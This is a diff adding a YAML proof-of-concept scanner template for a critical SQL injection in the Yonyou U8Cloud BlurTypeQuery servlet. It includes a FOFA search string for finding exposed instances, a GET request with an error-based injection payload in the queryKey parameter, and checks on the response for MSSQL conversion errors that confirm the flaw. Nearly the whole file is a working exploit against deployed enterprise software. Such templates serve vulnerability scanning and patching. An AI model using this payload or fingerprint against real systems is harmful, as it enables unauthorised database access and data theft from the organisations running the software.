@@ -1,0 +1,22 @@
+id: poc-yaml-yongyou-u8cloud-blurtypequery-sqli
+info:
+  name: 用友U8Cloud BlurTypeQuery SQL注入漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: 用友U8cloud
+  fofa: body="开启U8 cloud云端之旅"
+requests:
+- method: GET
+  path: /servlet/~iufo/nc.itf.iufo.mobilereport.data.BlurTypeQuery?queryKey=1%27)or(1=@@version)--+
+  expression: 'status_code == 200
+
+    && contains(body,"nvarchar")
+
+    && contains(body,"Microsoft SQL Server")
+
+    && contains(body,"转换成数据类型 int 时失败")
+
+    '
+variables: {}
+transport: http
